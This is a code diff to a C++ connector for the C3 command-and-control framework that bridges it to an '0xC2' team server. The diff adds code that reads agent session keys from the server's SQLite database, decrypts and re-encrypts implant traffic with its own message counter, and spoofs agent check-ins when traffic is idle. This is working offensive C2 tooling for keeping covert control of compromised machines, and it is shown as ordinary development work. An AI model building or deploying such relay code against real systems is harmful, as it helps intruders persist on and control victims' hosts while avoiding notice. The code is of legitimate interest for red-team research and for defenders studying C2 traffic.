@@ -1,9 +1,13 @@
 #include "StdAfx.h"
+
+#ifdef C3_IS_GATEWAY
 #include "Common/FSecure/Sockets/SocketsException.h"
 #include "Common/json/json.hpp"
 #include "Common/CppRestSdk/include/cpprest/http_client.h"
 #include "Common/FSecure/Crypto/Base64.h"
-#include "Common/FSecure/CppTools/Compression.h"
+#include "Common/FSecure/Crypto/Sodium.h"
+#include "Common/sqlite/sqlite3.h"
+#include <vector>
 
 using json = nlohmann::json;
 
@@ -40,10 +44,14 @@ namespace FSecure::C3::Interfaces::Connectors
 		/// @return Capability description in JSON format.
 		static const char* GetCapability();
 
+		// Path to 0xC2 database
+		std::string m_databasePath;
+
 	private:
 		/// Represents a single C3 <-> 0xC2 connection, as well as each 0xC2Agent in network.
 		struct Connection : std::enable_shared_from_this<Connection>
 		{
+
 			/// Constructor.
 			/// @param listeningPostAddress adders of Bridge.
 			/// @param listeningPostPort port of Bridge.
@@ -71,8 +79,24 @@ namespace FSecure::C3::Interfaces::Connectors
 			/// @returns true if receiving thread was started, false otherwise.
 			bool SecondThreadStarted();
 
+			struct KeyEntry {
+				std::string sessionKey;
+				uint32_t agentID;
+			};
+
+			bool DecryptMessage(FSecure::ByteView message);
+			FSecure::ByteVector GenerateCheckin();
+			std::vector<KeyEntry> ReadKeysFromDatabase(const std::string& dbPath);
+			FSecure::ByteVector EncryptAgentPacket(FSecure::ByteVector packet);
+			FSecure::ByteVector RepackMessage(FSecure::ByteView cipherMessage);
+
 			/// Received messages from the beacon
 			std::deque<ByteVector> m_RecvQueue;
+
+			FSecure::ByteVector m_SessionKey = {};
+			UINT32 m_AgentId = 0;
+			bool m_SessionKeyVerified = false;
+			UINT32 m_MessageCounter = 0;
 
 		private:
 			/// Pointer to TeamServer instance.
@@ -100,8 +124,6 @@ namespace FSecure::C3::Interfaces::Connectors
 		FSecure::ByteVector CloseConnection(ByteView arguments);
 
 		bool UpdateListenerId();
-
-		bool UpdateTemplateId();
 
 		/// Initializes Sockets library. Can be called multiple times, but requires corresponding number of calls to DeinitializeSockets() to happen before closing the application.
 		/// @return value forwarded from WSAStartup call (zero if successful).
@@ -156,7 +178,6 @@ namespace FSecure::C3::Interfaces::Connectors
 
 		/// Map of all connections.
 		std::unordered_map<std::string, std::shared_ptr<Connection>> m_ConnectionMap;
-
 	};
 }
 
@@ -216,7 +237,7 @@ FSecure::C3::Interfaces::Connectors::OhxC2::OhxC2(ByteView arguments)
 	json postData;
 	json response;
 
-	std::tie(m_externalListenerName, m_listenerName, m_webHost, m_username, m_password, m_udvt64, m_udvt32, m_pipename) = arguments.Read<std::string, std::string, std::string, std::string, std::string, std::string, std::string, std::string>();
+	std::tie(m_externalListenerName, m_listenerName, m_webHost, m_username, m_password, m_udvt64, m_udvt32, m_pipename, m_databasePath) = arguments.Read<std::string, std::string, std::string, std::string, std::string, std::string, std::string, std::string, std::string>();
 
 	// if the last character is '/' remove it
 	if (this->m_webHost.back() == '/')
@@ -253,7 +274,7 @@ FSecure::C3::Interfaces::Connectors::OhxC2::OhxC2(ByteView arguments)
 
 	this->m_token = response[OBF("access_token")].get<std::string>();
 
-	// TODO: If the listener doesn't already exist create it.
+	// TODO: If the listener doesn't already exist create it?
 	if (UpdateListenerId())
 	{
 		InitializeSockets();
@@ -447,9 +468,16 @@ const char* FSecure::C3::Interfaces::Connectors::OhxC2::GetCapability()
 			{
 				"type": "string",
 				"name": "Pipename",
-				"default": "test",
+				"defaultValue": "test",
 				"min": 4,
 				"description": "Pipename compiled in the UDVT"
+			},
+			{
+				"type": "string",
+				"name": "0xC2 Database Path",
+				"defaultValue": "/0xc2/c2.db",
+				"min": 4,
+				"description": "Path to the 0xC2 Database to retrieve encryption keys"
 			}
 		]
 	},
@@ -588,7 +616,41 @@ void FSecure::C3::Interfaces::Connectors::OhxC2::Connection::StartUpdatingInSepa
 					{
 						auto msg = std::move(m_RecvQueue.front());
 						m_RecvQueue.pop_front();
-						Send(msg);
+
+						if (msg.size() == 56u)
+						{
+							if (!m_SessionKeyVerified)
+							{
+								// Attempt to Decrypt Message
+								if (DecryptMessage(msg))
+								{
+									//Send nullbyte to signal we dont need more checkins:
+									bridge->PostCommandToBinder(m_Id, "\0"_bv);
+									// Skip the counter forwards to prevent any replay clash.
+									m_MessageCounter += 10;
+								}
+
+								// We shouldn't need to stop sending these messages as the Agent will stop sending them
+								// and expect us to generate our own.
+								Send(msg);
+							}
+						}
+						else
+						{
+							// Repack data messages with our own messageCounter
+							if (m_SessionKeyVerified)
+								Send(RepackMessage(msg));
+							else
+								Send(msg);
+						}
+					}
+					else
+					{
+						if (m_SessionKeyVerified)
+						{
+							auto spoof = GenerateCheckin();
+							Send(spoof);
+						}
 					}
 
 					// Read packet and post it to Binder.
@@ -623,4 +685,138 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::PeripheralCreati
 	return ByteVector{}.Write(m_pipename, maxConnectionAttempts, delayBetweenConnectionTrials, useSyscalls, GeneratePayload(connectionId, isX64));
 }
 
+bool FSecure::C3::Interfaces::Connectors::OhxC2::Connection::DecryptMessage(FSecure::ByteView message)
+{
+	if (!m_SessionKeyVerified)
+	{
+		std::string pathToDatabase;
+		if (auto owner = m_Owner.lock()) {
+			// Now owner is a shared_ptr, and you can access public members
+			pathToDatabase = owner->m_databasePath;
+		}
+		else
+		{
+			return false;
+		}
 
+		auto agentKeys = ReadKeysFromDatabase(pathToDatabase);
+		FSecure::ByteView messageView{ message };
+
+		for (const KeyEntry& entry : agentKeys) {
+			FSecure::ByteVector sessionKey = cppcodec::base64_rfc4648::decode(entry.sessionKey);
+
+			if (messageView.size() < crypto_auth_hmacsha256_BYTES)
+				throw std::runtime_error(OBF("Invalid message size"));
+
+			auto ivCiphertext = messageView.SubString(0, messageView.size() - crypto_auth_hmacsha256_BYTES);
+			auto hmac = messageView.SubString(messageView.size() - crypto_auth_hmacsha256_BYTES, crypto_auth_hmacsha256_BYTES);
+
+			if (FSecure::Crypto::Sodium::VerifyHMAC(sessionKey, ivCiphertext, hmac))
+			{
+				m_SessionKey = sessionKey;
+				m_AgentId = entry.agentID;
+				m_SessionKeyVerified = true;
+				break;
+			}
+		}
+
+		if (m_SessionKeyVerified && message.size() == 56u)
+		{
+			auto iv = messageView.SubString(0, 16);
+			auto ciphertext = messageView.SubString(16, messageView.size() - crypto_auth_hmacsha256_BYTES - 16);
+			auto plaintext = FSecure::Crypto::Sodium::AES_CTR_Process(m_SessionKey, iv, ciphertext);
+
+			if (plaintext.size() == 8)
+			{
+				UINT32 agentId = *reinterpret_cast<const UINT32*>(plaintext.data());
+				UINT32 messageCounter = *reinterpret_cast<const UINT32*>(plaintext.data() + 4);
+
+				m_MessageCounter = messageCounter;
+				return true;
+			}
+		}
+	}
+	return false;
+}
+
+FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::Connection::RepackMessage(FSecure::ByteView cipherMessage)
+{
+	m_MessageCounter++;
+	auto iv = cipherMessage.SubString(0, 16);
+	auto ciphertext = cipherMessage.SubString(16, cipherMessage.size() - crypto_auth_hmacsha256_BYTES - 16);
+	auto plaintext = FSecure::Crypto::Sodium::AES_CTR_Process(m_SessionKey, iv, ciphertext);
+
+	// 01 00 00 00 01 00 00 00 83 f5 a8 20 7d c8 85 18 0a 00 00 00 00 01 00 00 00 5a a9 6c 51 b7 ee b2 d1 a3 69 9b e0 35 a9 56 51 8f ee d5 d1 e1 69 ef e0 10 54 57 b6 0d bb d1 15 3b 73 01 27 f8 4e 7d f4 ae c9 c4 25 5c 01 9c 12 71 b9 dd a0 f0 99 29 21 00 00 00 00
+	// ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  ?  agent id messageCnt  null ? ? ? ?   data   (RC4?)
+	// Replace 5th DWORD (offset 16) with our messageCounter value
+	std::vector<uint8_t> buffer{ plaintext.begin(), plaintext.end() };
+
+	size_t offset = 16;
+	if (buffer.size() >= offset + 4) {
+		std::memcpy(buffer.data() + offset, &m_MessageCounter, sizeof(UINT32));
+	}
+	auto updatedPlaintext = FSecure::ByteVector{ buffer.begin(), buffer.end() };
+
+	return EncryptAgentPacket(updatedPlaintext);
+}
+
+FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::Connection::EncryptAgentPacket(FSecure::ByteVector packet)
+{
+	// Generate a random IV
+	std::vector<uint8_t> randomBytes = FSecure::Utils::GenerateRandomData<std::vector<uint8_t>>(16);
+	FSecure::ByteView iv{ randomBytes.data(), randomBytes.size() };
+	auto encryptedPacket = FSecure::Crypto::Sodium::AES_CTR_Process(m_SessionKey, iv, packet);
+	FSecure::ByteVector combined;
+	combined.insert(combined.end(), iv.begin(), iv.end());       // Append IV
+	combined.insert(combined.end(), encryptedPacket.begin(), encryptedPacket.end()); // Append ciphertext
+
+	auto hmac = FSecure::Crypto::Sodium::ComputeHMAC(m_SessionKey, combined);
+	combined.insert(combined.end(), hmac.begin(), hmac.end()); // Append HMAC
+	return combined;
+}
+
+FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::Connection::GenerateCheckin()
+{
+	m_MessageCounter++;
+	FSecure::ByteVector checkin;
+
+	checkin.insert(checkin.end(),
+		reinterpret_cast<uint8_t*>(&m_AgentId),
+		reinterpret_cast<uint8_t*>(&m_AgentId) + sizeof(m_AgentId));
+
+	// Append messageCounter
+	checkin.insert(checkin.end(),
+		reinterpret_cast<uint8_t*>(&m_MessageCounter),
+		reinterpret_cast<uint8_t*>(&m_MessageCounter) + sizeof(m_MessageCounter));
+
+	return EncryptAgentPacket(checkin);
+}
+
+std::vector<FSecure::C3::Interfaces::Connectors::OhxC2::Connection::KeyEntry> FSecure::C3::Interfaces::Connectors::OhxC2::Connection::ReadKeysFromDatabase(const std::string& dbPath)
+{
+	sqlite3* db = nullptr;
+	std::vector<KeyEntry> keys;
+
+	if (sqlite3_open(dbPath.c_str(), &db) != SQLITE_OK)
+		throw std::runtime_error(OBF("Failed to open database"));
+
+	const char* query = "SELECT sessionKey, agentID FROM Keys WHERE sessionKey IS NOT NULL AND sessionKey != '' ORDER BY keyID DESC LIMIT 10";
+	sqlite3_stmt* stmt = nullptr;
+
+	if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) {
+		sqlite3_close(db);
+		throw std::runtime_error(OBF("Failed to prepare query"));
+	}
+
+	while (sqlite3_step(stmt) == SQLITE_ROW) {
+		const unsigned char* sessionKey = sqlite3_column_text(stmt, 0);
+		uint32_t agentID = static_cast<uint32_t>(sqlite3_column_int(stmt, 1));
+
+		keys.emplace_back(KeyEntry{ std::string(reinterpret_cast<const char*>(sessionKey)), agentID });
+	}
+
+	sqlite3_finalize(stmt);
+	sqlite3_close(db);
+	return keys;
+}
+#endif// C3_IS_GATEWAY
